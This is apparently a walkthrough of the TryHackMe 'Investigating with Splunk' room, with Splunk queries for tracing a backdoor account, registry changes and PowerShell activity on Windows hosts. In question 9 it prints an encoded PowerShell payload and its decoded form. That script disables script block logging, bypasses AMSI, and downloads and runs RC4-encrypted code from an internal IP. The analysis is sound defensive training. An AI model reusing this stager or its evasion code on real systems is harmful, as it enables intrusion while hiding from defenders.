# Investigating with Splunk Walkthrough

Welcome to the "Investigating with Splunk" CTF Writeup, as the title suggest we are going to analyze and investigate some logs using Splunk, than, one we have collected all the information, we have to provide some answers to complete the challenge. <br/>
Here is the link to the challenge on TryHackMe: https://tryhackme.com/room/investigatingwithsplunk

Before starting the challenge it is suggested to have some knowledge about Splunk and logs investigation, as it will be the key to solve it.  
In order to complete the challenge we have to analyze and find clues to submit 10 answers to the related questions.  

As always in the THM challenges i will not post the answers but a step by step guide to get them. Find out more in the README.md file.
<br/>
<br/>

### The Scenario
SOC Analyst **Johny** has observed some anomalous behaviors in the logs of a few windows machines. It looks like the adversary has access to some of these machines and successfully created some backdoor. His manager has asked him to pull those logs from suspected hosts and ingest them into Splunk for quick investigation. Our task as SOC Analyst is to examine the logs and identify the anomalies.
<br/>
<br/>

### Investigation
Start the machine and wait around 5 minutes, when it is ready visit the machine IP from the attack box or your own device connected with OpenVPN.

Once inside Splunk, click on the left side **Search and Reporting**, here is the ground for our investigations.

Firstly click on the data on the top right and select "All Time", this way we will see all the collected logs.
We know that the logs we want to check are saved in the index main, to tell Splunk to show them we have to write in the search bar `index=main`

Now is time to hunt for anomalies in the logs and find which host was infected and what exactly has happened.
<br/>
<br/>

### Questions
**1. How many events were collected and Ingested in the 'index main'?**
```
index=main 
```
<br/>

**2. On one of the infected hosts, the adversary was successful in creating a backdoor user. What is the new username?**
Since we know that a new account has been created we can filter for this specific type of event. After searching it up i found that the ID for that event is "4720".
Let's add it to the search and give a look at the only log that appears, we can see the new user name.
```
index=main EventID="4720"
```
<br/>

**3. On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key?**
In this case we have to change the eventID to 13, we can also add the new user name to the search to better filter the results.
```
index=main EventID="13" A1berto
```
<br/>


**4. Examine the logs and identify the user that the adversary was trying to impersonate.**
Checking the user field on the left side we notice that there is a legitimate user with a very similar name.
<br/>

**5. What is the command used to add a backdoor user from a remote computer?**
This time we are searching the system logs events which id is 1.
```
index=main EventID="1"
```
Now there are 25 logs to analyze but, checking on the left side, the **CommandLine** filter shows 4 commands and we can identify the one we are interested in
<br/>

**6. How many times was the login attempt from the backdoor user observed during the investigation?**
We can filter for events related to the fake user and notice that there are no events, this means we have observed 0 events.
```
index=main User="A1berto"
```
<br/>

**7. What is the name of the infected host on which suspicious PowerShell commands were executed?**
Le'ts search Powershell and than use the **Hostname** filter on the left side, we can see there is only one value:
```
index=main Powershell
```
<br/>

**8. PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution?**
In Windows all the PowerShell commands are logged with the EventID 4103
```
index=main EventID="4103"
```
<br/>

**9. An encoded PowerShell script from the infected host initiated a web request. What is the full URL?**
Further  analyzing the logs of question 5 we can notice some encoded data in base 64.
```
SQBGACgAJABQAFMAVgBlAHIAUwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJAAxADEAQgBEADgAPQBbAHIAZQBGAF0ALgBBAFMAcwBlAE0AYgBsAHkALgBHAGUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAMQAxAEIAZAA4ACkAewAkAEEAMQA4AEUAMQA9ACQAMQAxAEIARAA4AC4ARwBlAHQAVgBhAEwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABhADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AEEATAA9AFsAQwBvAEwAbABlAGMAdABpAE8ATgBTAC4ARwBlAE4ARQByAGkAQwAuAEQASQBjAFQAaQBPAG4AQQBSAFkAWwBTAHQAcgBJAE4ARwAsAFMAeQBzAFQARQBtAC4ATwBCAEoARQBjAHQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAYQAxADgAZQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMARQB7AFsAUwBjAFIAaQBwAFQAQgBsAE8AQwBLAF0ALgAiAEcAZQBUAEYASQBFAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbABVAGUAKAAkAE4AdQBMAE
```
We can copy this and drop it in an online base 64 decoder or use the Linux binary and we get this:
```
IF($PSVerSIonTabLe.PSVErSION.MaJOR -Ge 3){$11BD8=[reF].ASseMbly.GetTyPE('System.Management.Automation.Utils')."GETFIe`ld"('cachedGroupPolicySettings','N'+'onPublic,Static');IF($11Bd8){$A18E1=$11BD8.GetVaLUE($nUlL);If($A18e1['ScriptB'+'lockLogging']){$A18e1['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$a18e1['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$vAL=[CoLlectiONS.GeNEriC.DIcTiOnARY[StrING,SysTEm.OBJEct]]::neW();$vAL.AdD('EnableScriptB'+'lockLogging',0);$VAL.Add('EnableScriptBlockInvocationLogging',0);$a18e1['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAl}ELsE{[ScRipTBlOCK]."GeTFIE`Ld"('signatures','N'+'onPublic,Static').SEtVAlUe($NuLL,(NEw-OBjeCt CoLLEcTiONS.GeNerIc.HAsHSet[STring]))}$ReF=[Ref].AsSEMBly.GeTTyPe('System.Management.Automation.Amsi'+'Utils');$Ref.GEtFIeLd('amsiInitF'+'ailed','NonPublic,Static').SEtVALue($NULl,$tRUe);};[SYStEm.NeT.ServICePoINtMAnAgER]::EXpeCT100ContINue=0;$7a6eD=NeW-OBJeCT SYsteM.Net.WEbClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([TeXT.ENCodiNG]::UnicodE.GetStriNG([CoNVeRT]::FroMBASe64StRInG('aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==')));$t='/news.php';$7A6Ed.HEAders.Add('User-Agent',$u);$7a6Ed.PROxY=[SySTEm.NET.WebREQUesT]::DefAULtWeBPRoXY;$7a6ED.PROXY.CRedEntIAlS = [SYsTEM.NEt.CRedEnTIaLCachE]::DEFaUltNETwoRKCrEdeNtIALS;$Script:Proxy = $7a6ed.Proxy;$K=[SysteM.TeXT.EnCoDIng]::ASCII.GeTByTeS('qm.@)5y?XxuSA-=VD467*|OLWB~rn8^I');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CoUnt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BxoR$S[($S[$I]+$S[$H])%256]}};$7A6ed.HeADers.Add("Cookie","KuUzuid=VmeKV5dekg9y7k/tlFFA8b2AaIs=");$Data=$7a6ed.DowNLoadDatA($SEr+$t);$iv=$DATA[0..3];$DaTA=$dATA[4..$DaTA.LEnGtH];-JOiN[Char[]](& $R $dAta ($IV+$K))|IEX
```
Now investigating this payload there is a another base 64 encoded string
```
aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==
```
Let's decode this as well and we get the URL, now paste it in cyberchef to defang it.
<br/>
<br/>

Congratulations you have completed the investigation, hope you had fun as well. <br/>
See you in the next CTF WriteUp 🤗



